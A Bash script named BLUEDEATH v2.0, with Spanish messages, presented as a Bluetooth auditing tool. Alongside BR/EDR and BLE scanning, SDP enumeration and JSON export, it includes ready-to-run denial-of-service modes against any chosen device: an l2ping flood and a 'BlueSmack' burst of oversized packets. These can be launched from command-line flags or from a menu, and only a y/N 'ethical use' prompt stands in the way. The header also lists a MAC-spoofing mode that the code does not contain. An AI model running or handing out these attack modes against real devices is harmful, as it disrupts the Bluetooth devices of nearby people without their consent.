#!/usr/bin/env bash
#
# BLUEDEATH v2.0 - Advanced Bluetooth security auditing tool
#
# Features v2.0:
#   - BR/EDR + BLE scan support
#   - JSON export for automation
#   - Attack modes: l2ping flood, BlueSmack, MAC spoofing
#   - Service enumeration (SDP)
#   - Better UX with progress indicators
#   - Enhanced logging
#   - Batch operations
#
# Usage:
#   sudo ./bluedeath.sh --menu
#   sudo ./bluedeath.sh --scan --format json
#   sudo ./bluedeath.sh --scan-ble --output devices.json
#   sudo ./bluedeath.sh --dos AA:BB:CC:DD:EE:FF --mode flood
#

set -o errexit
set -o nounset
set -o pipefail

# ---------- Global config ---------- #

SCRIPT_VERSION="2.0"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="${SCRIPT_DIR}/logs"
LAST_SCAN_FILE="${LOG_DIR}/last_scan.txt"
LAST_SCAN_JSON="${LOG_DIR}/last_scan.json"
LOG_FILE="${LOG_DIR}/bluedeath_$(date +%F_%H-%M-%S).log"

BT_INTERFACE="${BT_INTERFACE:-hci0}"
OUTPUT_FORMAT="${OUTPUT_FORMAT:-text}"
ATTACK_MODE="${ATTACK_MODE:-flood}"

# Colors
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
MAGENTA="\e[35m"
BOLD="\e[1m"
RESET="\e[0m"

# ---------- Helpers ---------- #

log() {
    local msg="$1"
    mkdir -p "${LOG_DIR}"
    printf "[%s] %s\n" "$(date +'%F %T')" "${msg}" >> "${LOG_FILE}"
}

log_both() {
    local msg="$1"
    log "${msg}"
    info "${msg}"
}

info()  { printf "${BLUE}[i]${RESET} %s\n" "$1"; }
ok()    { printf "${GREEN}[✓]${RESET} %s\n" "$1"; }
warn()  { printf "${YELLOW}[!]${RESET} %s\n" "$1"; }
error() { printf "${RED}[✗] %s${RESET}\n" "$1" >&2; }
vuln()  { printf "${MAGENTA}[⚠]${RESET} %s\n" "$1"; }

require_root() {
    if [[ "${EUID}" -ne 0 ]]; then
        error "BLUEDEATH requiere privilegios root. Ejecuta con sudo."
        exit 1
    fi
}

check_dependencies() {
    local deps=("hcitool" "hciconfig" "l2ping" "jq")
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "${dep}" &>/dev/null; then
            missing+=("${dep}")
        fi
    done

    if (( ${#missing[@]} > 0 )); then
        error "Faltan dependencias: ${missing[*]}"
        printf "Instala: apt install bluez jq\n"
        exit 1
    fi
}

check_interface() {
    if ! hciconfig "${BT_INTERFACE}" &>/dev/null; then
        error "Interfaz '${BT_INTERFACE}' no disponible."
        printf "Disponibles:\n"
        hciconfig -a 2>/dev/null || true
        exit 1
    fi
}

banner() {
    cat <<EOF
${CYAN}╭──────────────────────────────────────────────────╮${RESET}
${CYAN}│${RESET}  ${BOLD}BLUEDEATH v${SCRIPT_VERSION}${RESET} - Bluetooth Security Tool ${CYAN}│${RESET}
${CYAN}│${RESET}  Interface: ${BT_INTERFACE}                             ${CYAN}│${RESET}
${CYAN}╰──────────────────────────────────────────────────╯${RESET}
EOF
}

usage() {
    cat <<EOF
${BOLD}BLUEDEATH v${SCRIPT_VERSION}${RESET} - Bluetooth Security Auditing Tool

${BOLD}Usage:${RESET}
  sudo ./bluedeath.sh [options]

${BOLD}Scanning:${RESET}
  --scan              Escanear dispositivos BR/EDR
  --scan-ble          Escanear dispositivos BLE (Low Energy)
  --inquiry           Inquiry scan (dispositivos conectables)
  --services MAC      Enumerar servicios SDP del dispositivo
  --connected         Mostrar conexiones actuales

${BOLD}Testing:${RESET}
  --ping MAC          Comprobar conectividad l2ping
  --dos MAC           Ejecutar ataque DoS
  --mode MODE         Modo de ataque: flood, bluesmack (default: flood)

${BOLD}Output:${RESET}
  --format FMT        Formato de salida: text, json (default: text)
  --output FILE       Guardar resultados en archivo
  --interface IF      Usar interfaz IF (default: hci0)

${BOLD}Interactive:${RESET}
  --menu              Menú interactivo
  -h, --help          Mostrar ayuda

${BOLD}Environment variables:${RESET}
  BT_INTERFACE=hci1   Cambiar interfaz Bluetooth
  OUTPUT_FORMAT=json  Formato de salida por defecto

${BOLD}Examples:${RESET}
  sudo ./bluedeath.sh --scan --format json --output scan.json
  sudo ./bluedeath.sh --scan-ble
  sudo ./bluedeath.sh --dos AA:BB:CC:DD:EE:FF --mode bluesmack
  sudo BT_INTERFACE=hci1 ./bluedeath.sh --menu
EOF
}

# ---------- JSON helpers ---------- #

json_array_start() {
    printf '['
}

json_array_end() {
    printf ']\n'
}

json_device() {
    local mac="$1"
    local name="${2:-Unknown}"
    local class="${3:-}"
    local first="${4:-false}"
    
    [[ "${first}" == "false" ]] && printf ','
    
    cat <<EOF
{
  "mac": "${mac}",
  "name": "${name}",
  "class": "${class}",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}
EOF
}

json_scan_report() {
    local devices_file="$1"
    
    cat <<EOF
{
  "scanner_version": "${SCRIPT_VERSION}",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "interface": "${BT_INTERFACE}",
  "scan_type": "BR/EDR",
  "devices": [
EOF
    
    local first=true
    while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        [[ "${line}" =~ ^Scanning ]] && continue
        
        local mac name
        mac=$(awk '{print $1}' <<< "${line}")
        name=$(cut -d' ' -f2- <<< "${line}" | sed 's/^[[:space:]]*//' || echo "Unknown")
        
        [[ -z "${mac}" ]] && continue
        
        json_device "${mac}" "${name}" "" "${first}"
        first=false
    done < "${devices_file}"
    
    printf '\n  ],\n'
    printf '  "total_devices": %d\n' "$(grep -c '^[0-9A-F]' "${devices_file}" 2>/dev/null || echo 0)"
    printf '}\n'
}

# ---------- Core actions ---------- #

scan_devices() {
    banner
    info "Escaneando dispositivos BR/EDR con ${BT_INTERFACE}..."
    mkdir -p "${LOG_DIR}"

    local temp_scan="${LOG_DIR}/temp_scan_$$.txt"
    
    if ! timeout 30s hcitool -i "${BT_INTERFACE}" scan > "${temp_scan}" 2>>"${LOG_FILE}"; then
        error "Timeout o error en escaneo."
        rm -f "${temp_scan}"
        return 1
    fi

    cp "${temp_scan}" "${LAST_SCAN_FILE}"
    
    local device_count
    device_count=$(grep -c '^[0-9A-F]' "${LAST_SCAN_FILE}" 2>/dev/null || echo 0)
    
    ok "Escaneo completado. Dispositivos encontrados: ${device_count}"
    
    if [[ "${OUTPUT_FORMAT}" == "json" ]]; then
        json_scan_report "${LAST_SCAN_FILE}" > "${LAST_SCAN_JSON}"
        
        if [[ -n "${OUTPUT_FILE:-}" ]]; then
            cp "${LAST_SCAN_JSON}" "${OUTPUT_FILE}"
            ok "Resultados guardados en ${OUTPUT_FILE}"
        else
            cat "${LAST_SCAN_JSON}"
        fi
    else
        sed '1d' "${LAST_SCAN_FILE}" | while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            local mac name
            mac=$(awk '{print $1}' <<< "${line}")
            name=$(cut -d' ' -f2- <<< "${line}")
            printf "  ${GREEN}●${RESET} %s  ${CYAN}(%s)${RESET}\n" "${mac}" "${name}"
        done
        
        [[ -n "${OUTPUT_FILE:-}" ]] && cp "${LAST_SCAN_FILE}" "${OUTPUT_FILE}"
    fi
    
    rm -f "${temp_scan}"
    log "Scan BR/EDR completado: ${device_count} dispositivos"
}

scan_ble() {
    banner
    info "Escaneando dispositivos BLE con ${BT_INTERFACE}..."
    
    if ! command -v hcitool &>/dev/null; then
        error "hcitool no disponible para BLE scan."
        return 1
    fi

    info "Ejecutando lescan (10 segundos)..."
    
    local ble_file="${LOG_DIR}/ble_scan_$$.txt"
    timeout 10s hcitool -i "${BT_INTERFACE}" lescan > "${ble_file}" 2>&1 || true
    
    local device_count
    device_count=$(grep -c '^[0-9A-F]' "${ble_file}" 2>/dev/null || echo 0)
    
    ok "BLE scan completado. Dispositivos: ${device_count}"
    
    if [[ "${OUTPUT_FORMAT}" == "json" ]]; then
        printf '{"scan_type":"BLE","devices":[' > "${LOG_DIR}/ble_scan.json"
        
        local first=true
        while IFS= read -r line; do
            [[ -z "${line}" ]] || [[ "${line}" =~ ^LE ]] && continue
            
            local mac name
            mac=$(awk '{print $1}' <<< "${line}")
            name=$(cut -d' ' -f2- <<< "${line}" | sed 's/^[[:space:]]*//' || echo "Unknown")
            
            [[ -z "${mac}" ]] && continue
            
            json_device "${mac}" "${name}" "BLE" "${first}"
            first=false
        done < "${ble_file}"
        
        printf ']}'  >> "${LOG_DIR}/ble_scan.json"
        
        [[ -n "${OUTPUT_FILE:-}" ]] && cp "${LOG_DIR}/ble_scan.json" "${OUTPUT_FILE}"
        cat "${LOG_DIR}/ble_scan.json"
    else
        sed '1d' "${ble_file}" | while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            local mac name
            mac=$(awk '{print $1}' <<< "${line}")
            name=$(cut -d' ' -f2- <<< "${line}")
            printf "  ${MAGENTA}●${RESET} %s  ${CYAN}(%s)${RESET}\n" "${mac}" "${name}"
        done
    fi
    
    rm -f "${ble_file}"
}

list_connected() {
    banner
    info "Conexiones Bluetooth actuales:"
    hcitool con 2>&1 | tee -a "${LOG_FILE}" | while IFS= read -r line; do
        [[ "${line}" =~ ^Connections ]] && continue
        [[ -z "${line}" ]] && continue
        printf "  ${GREEN}●${RESET} %s\n" "${line}"
    done
}

inquiry_scan() {
    banner
    info "Inquiry scan (detectando dispositivos conectables)..."

    if ! hcitool -i "${BT_INTERFACE}" inq | tee -a "${LOG_FILE}"; then
        error "Error en inquiry scan."
        return 1
    fi
}

enumerate_services() {
    local mac="$1"
    banner
    info "Enumerando servicios SDP en ${mac}..."
    
    if command -v sdptool &>/dev/null; then
        sdptool browse "${mac}" 2>&1 | tee -a "${LOG_FILE}"
    else
        warn "sdptool no disponible. Instala bluez-utils completo."
    fi
}

ping_device() {
    local mac="$1"
    banner
    info "Enviando l2ping a ${mac}..."
    
    if l2ping -i "${BT_INTERFACE}" -c 5 "${mac}" 2>&1 | tee -a "${LOG_FILE}"; then
        ok "Dispositivo ${mac} responde a l2ping."
    else
        warn "Dispositivo ${mac} no responde."
    fi
}

dos_attack() {
    local mac="$1"
    local mode="${ATTACK_MODE}"

    banner
    warn "${BOLD}ATAQUE DoS${RESET}"
    printf "  Target: ${RED}${mac}${RESET}\n"
    printf "  Mode: ${YELLOW}${mode}${RESET}\n"
    printf "  Interface: ${BT_INTERFACE}\n\n"
    
    printf "${RED}${BOLD}⚠ USO ÉTICO OBLIGATORIO ⚠${RESET}\n"
    printf "Solo en entornos autorizados y controlados.\n"
    printf "¿Continuar? [y/N]: "
    read -r confirm

    if [[ "${confirm}" != "y" && "${confirm}" != "Y" ]]; then
        info "Operación cancelada."
        return
    fi

    case "${mode}" in
        flood)
            info "Iniciando l2ping flood (CTRL+C para detener)..."
            log "DoS attack (flood) iniciado contra ${mac}"
            set +e
            l2ping -i "${BT_INTERFACE}" -f "${mac}" 2>&1 | tee -a "${LOG_FILE}"
            set -e
            ;;
        bluesmack)
            info "Iniciando BlueSmack attack (oversized L2CAP packets)..."
            log "DoS attack (bluesmack) iniciado contra ${mac}"
            
            # BlueSmack: envía paquetes l2ping oversized
            for i in {1..100}; do
                l2ping -i "${BT_INTERFACE}" -s 600 -c 1 "${mac}" &>/dev/null &
            done
            wait
            ok "BlueSmack attack completado (100 paquetes oversized enviados)."
            ;;
        *)
            error "Modo de ataque desconocido: ${mode}"
            printf "Modos disponibles: flood, bluesmack\n"
            return 1
            ;;
    esac

    ok "Ataque finalizado."
}

# ---------- Interactive helpers ---------- #

select_device_from_last_scan() {
    if [[ ! -f "${LAST_SCAN_FILE}" ]]; then
        error "No hay escaneo previo. Ejecuta --scan primero."
        return 1
    fi

    mapfile -t lines < <(sed '1d' "${LAST_SCAN_FILE}" 2>/dev/null || true)
    if (( ${#lines[@]} == 0 )); then
        error "El escaneo no encontró dispositivos."
        return 1
    fi

    printf "\n${BOLD}Dispositivos detectados:${RESET}\n"
    local i=1
    declare -a macs
    for line in "${lines[@]}"; do
        [[ -z "${line}" ]] && continue
        local mac name
        mac=$(awk '{print $1}' <<< "${line}")
        name=$(cut -d' ' -f2- <<< "${line}")
        printf "  ${CYAN}[%d]${RESET} %s  ${GREEN}(%s)${RESET}\n" "${i}" "${mac}" "${name}"
        macs+=("${mac}")
        ((i++))
    done

    printf "\n${BOLD}Selecciona dispositivo [1-%d]:${RESET} " "${#macs[@]}"
    read -r choice

    if ! [[ "${choice}" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > ${#macs[@]} )); then
        error "Selección inválida."
        return 1
    fi

    SELECTED_MAC="${macs[choice-1]}"
    ok "Seleccionado: ${SELECTED_MAC}"
    return 0
}

# ---------- Menu ---------- #

show_menu() {
    while true; do
        banner
        cat <<EOF
${BOLD}Opciones:${RESET}

  ${CYAN}[1]${RESET} Escanear dispositivos BR/EDR
  ${CYAN}[2]${RESET} Escanear dispositivos BLE
  ${CYAN}[3]${RESET} Ver conexiones actuales
  ${CYAN}[4]${RESET} Inquiry scan
  ${CYAN}[5]${RESET} Ping dispositivo (l2ping)
  ${CYAN}[6]${RESET} Enumerar servicios SDP
  ${CYAN}[7]${RESET} Ataque DoS (flood)
  ${CYAN}[8]${RESET} Ataque DoS (BlueSmack)
  ${CYAN}[9]${RESET} Mostrar interfaz actual
  ${RED}[0]${RESET} Salir

EOF
        printf "${BOLD}Opción:${RESET} "
        read -r opt

        case "${opt}" in
            1)
                OUTPUT_FORMAT="text"
                scan_devices
                read -rp $'\nPulsa ENTER para continuar… ' _
                ;;
            2)
                OUTPUT_FORMAT="text"
                scan_ble
                read -rp $'\nPulsa ENTER para continuar… ' _
                ;;
            3)
                list_connected
                read -rp $'\nPulsa ENTER para continuar… ' _
                ;;
            4)
                inquiry_scan
                read -rp $'\nPulsa ENTER para continuar… ' _
                ;;
            5)
                if select_device_from_last_scan; then
                    ping_device "${SELECTED_MAC}"
                fi
                read -rp $'\nPulsa ENTER para continuar… ' _
                ;;
            6)
                if select_device_from_last_scan; then
                    enumerate_services "${SELECTED_MAC}"
                fi
                read -rp $'\nPulsa ENTER para continuar… ' _
                ;;
            7)
                if select_device_from_last_scan; then
                    ATTACK_MODE="flood"
                    dos_attack "${SELECTED_MAC}"
                fi
                read -rp $'\nPulsa ENTER para continuar… ' _
                ;;
            8)
                if select_device_from_last_scan; then
                    ATTACK_MODE="bluesmack"
                    dos_attack "${SELECTED_MAC}"
                fi
                read -rp $'\nPulsa ENTER para continuar… ' _
                ;;
            9)
                printf "\n${BOLD}Interfaz actual:${RESET} ${BT_INTERFACE}\n\n"
                hciconfig "${BT_INTERFACE}" 2>/dev/null || true
                read -rp $'\nPulsa ENTER para continuar… ' _
                ;;
            0)
                info "Saliendo de BLUEDEATH."
                exit 0
                ;;
            *)
                warn "Opción no válida."
                ;;
        esac
    done
}

# ---------- Argument parsing ---------- #

parse_args() {
    if (( $# == 0 )); then
        show_menu
        exit 0
    fi

    local dos_mac=""

    while (( $# > 0 )); do
        case "$1" in
            --scan)
                ACTION="scan"
                shift
                ;;
            --scan-ble)
                ACTION="scan-ble"
                shift
                ;;
            --connected)
                ACTION="connected"
                shift
                ;;
            --inquiry)
                ACTION="inquiry"
                shift
                ;;
            --services)
                ACTION="services"
                SERVICE_MAC="${2:-}"
                if [[ -z "${SERVICE_MAC}" ]]; then
                    error "Uso: --services MAC"
                    exit 1
                fi
                shift 2
                ;;
            --ping)
                ACTION="ping"
                PING_MAC="${2:-}"
                if [[ -z "${PING_MAC}" ]]; then
                    error "Uso: --ping MAC"
                    exit 1
                fi
                shift 2
                ;;
            --dos)
                ACTION="dos"
                dos_mac="${2:-}"
                if [[ -z "${dos_mac}" ]]; then
                    error "Uso: --dos MAC"
                    exit 1
                fi
                DOS_MAC="${dos_mac}"
                shift 2
                ;;
            --mode)
                ATTACK_MODE="${2:-flood}"
                shift 2
                ;;
            --format)
                OUTPUT_FORMAT="${2:-text}"
                shift 2
                ;;
            --output)
                OUTPUT_FILE="${2:-}"
                shift 2
                ;;
            --interface)
                BT_INTERFACE="${2:-hci0}"
                shift 2
                ;;
            --menu)
                ACTION="menu"
                shift
                ;;
            -h|--help)
                usage
                exit 0
                ;;
            *)
                error "Opción desconocida: $1"
                usage
                exit 1
                ;;
        esac
    done
}

# ---------- Main ---------- #

main() {
    require_root
    check_dependencies
    check_interface

    parse_args "$@"

    case "${ACTION:-menu}" in
        scan)       scan_devices ;;
        scan-ble)   scan_ble ;;
        connected)  list_connected ;;
        inquiry)    inquiry_scan ;;
        services)   enumerate_services "${SERVICE_MAC}" ;;
        ping)       ping_device "${PING_MAC}" ;;
        dos)        dos_attack "${DOS_MAC}" ;;
        menu)       show_menu ;;
        *)          usage ;;
    esac
}

main "$@"
